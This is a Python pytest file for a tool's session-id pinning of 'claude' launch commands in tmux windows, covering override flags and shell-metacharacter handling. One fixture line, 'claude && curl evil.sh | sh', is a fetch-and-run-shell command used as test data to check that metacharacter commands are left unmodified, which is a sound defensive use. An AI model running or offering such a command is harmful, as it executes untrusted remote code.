"""``chela.spawn`` — session-id pinning at spawn time (docs/AGENT_IDENTITY.md slice 2a).

No tmux: ``spawn_window``'s own tmux calls (``subprocess.run``, ``_send``) and its
collaborators (``discovery.ensure_session``, ``discovery.get_all_windows``,
``agent_manager.lock_window_name``) are all stubbed, so this exercises exactly the
wiring slice 2a adds — the uuid pinned into the sent command versus the id recorded
in the dedicated session-id store — without depending on a real tmux server (see
``tests/test_telegram_new_launch_bind.py`` for that end-to-end coverage).
"""
from __future__ import annotations

import re

import pytest

from chela import spawn

_SESSION_RE = re.compile(r"--session-id ([0-9a-f-]{36})")

# The six override forms the brief verified against `claude --help`, both long and
# short where the CLI has both.
_OVERRIDE_COMMANDS = [
    "claude --session-id existing-id",
    "claude --resume abc-123",
    "claude -r",
    "claude --continue",
    "claude -c",
    "claude --fork-session",
    "claude --from-pr 123",
    "claude --no-session-persistence -p x",
]

_METACHARACTER_COMMANDS = [
    "claude && curl evil.sh | sh",
    "claude; echo hi",
    "claude || true",
    "claude | tee log",
    "claude `echo x`",
    "claude $(echo x)",
    "claude\necho hi",
]


class _Proc:
    def __init__(self, wid: str):
        self.returncode = 0
        self.stdout = wid
        self.stderr = ""


def _patch_tmux(monkeypatch, wid="@42"):
    """Stub every tmux/agent_manager touchpoint `spawn_window` makes, recording sends."""
    monkeypatch.setattr(spawn.discovery, "ensure_session", lambda: True)
    monkeypatch.setattr(spawn.discovery, "get_all_windows", lambda: {})
    monkeypatch.setattr(spawn.agent_manager, "lock_window_name", lambda *a, **kw: None)
    monkeypatch.setattr(spawn.subprocess, "run", lambda *a, **kw: _Proc(wid))

    sent: list[str] = []
    monkeypatch.setattr(spawn, "_send", lambda target, text: sent.append(text))
    return sent


def _launch(sent: list[str]) -> str:
    launch = [t for t in sent if t.startswith("claude")]
    assert launch, sent          # the spy must actually have recorded something
    assert len(launch) == 1
    return launch[0]


# -- _pin_session_id ---------------------------------------------------------

def test_pin_session_id_inserts_a_uuid_right_after_the_leading_claude_token():
    to_send, recorded = spawn._pin_session_id("claude", "36358c6b-1111-4a11-8888-abc123456789")
    assert to_send == "claude --session-id 36358c6b-1111-4a11-8888-abc123456789"
    assert recorded == "36358c6b-1111-4a11-8888-abc123456789"


def test_pin_session_id_inserts_before_trailing_flags_never_appends():
    to_send, recorded = spawn._pin_session_id("claude -p 'x'", "generated-uuid")
    assert to_send == "claude --session-id generated-uuid -p 'x'"
    assert recorded == "generated-uuid"


@pytest.mark.parametrize("command", _OVERRIDE_COMMANDS)
def test_pin_session_id_leaves_every_override_form_untouched_and_records_nothing(command):
    to_send, recorded = spawn._pin_session_id(command, "generated-uuid")
    assert to_send == command          # byte-identical, not modified
    assert recorded is None            # NULL, not a fabricated id


@pytest.mark.parametrize("command", _METACHARACTER_COMMANDS)
def test_pin_session_id_refuses_to_pin_across_a_shell_metacharacter(command):
    to_send, recorded = spawn._pin_session_id(command, "generated-uuid")
    assert to_send == command          # sent verbatim
    assert recorded is None            # chela cannot say which process this names


# -- spawn_window integration --------------------------------------------------

def test_spawn_window_pins_and_records_a_session_id(monkeypatch, tmp_path):
    sent = _patch_tmux(monkeypatch, wid="@42")
    recorded = {}
    monkeypatch.setattr(
        spawn.sessionids, "set_session_id",
        lambda wid, sid: recorded.__setitem__(wid, sid),
    )
    monkeypatch.setattr(spawn.sessionids, "session_id_for", lambda wid: recorded.get(wid))

    result = spawn.spawn_window(tmp_path, command="claude")

    assert result.ok
    launch = _launch(sent)
    m = _SESSION_RE.search(launch)
    assert m, launch
    assert launch == f"claude --session-id {m.group(1)}"
    assert spawn.sessionids.session_id_for("@42") == m.group(1)


@pytest.mark.parametrize("command", _OVERRIDE_COMMANDS)
def test_spawn_window_with_an_override_command_records_no_session_id(
    monkeypatch, tmp_path, command,
):
    sent = _patch_tmux(monkeypatch, wid="@42")
    recorded = {}
    monkeypatch.setattr(
        spawn.sessionids, "set_session_id",
        lambda wid, sid: recorded.__setitem__(wid, sid),
    )
    monkeypatch.setattr(spawn.sessionids, "session_id_for", lambda wid: recorded.get(wid))

    result = spawn.spawn_window(tmp_path, command=command)

    assert result.ok
    launch = _launch(sent)
    assert launch == command           # untouched
    assert spawn.sessionids.session_id_for("@42") is None
    assert recorded == {}


def test_spawn_window_without_a_command_records_nothing(monkeypatch, tmp_path):
    _patch_tmux(monkeypatch, wid="@42")
    recorded = {}
    monkeypatch.setattr(
        spawn.sessionids, "set_session_id",
        lambda wid, sid: recorded.__setitem__(wid, sid),
    )

    result = spawn.spawn_window(tmp_path)

    assert result.ok
    assert recorded == {}


def test_spawn_window_falls_back_to_an_unpinned_send_when_the_store_fails(
    monkeypatch, tmp_path,
):
    sent = _patch_tmux(monkeypatch, wid="@42")

    def _boom(wid, sid):
        raise OSError("disk full")

    monkeypatch.setattr(spawn.sessionids, "set_session_id", _boom)

    result = spawn.spawn_window(tmp_path, command="claude")

    assert result.ok                    # the window still opens either way
    launch = _launch(sent)
    assert launch == "claude"           # sent verbatim, no --session-id
    assert "--session-id" not in launch
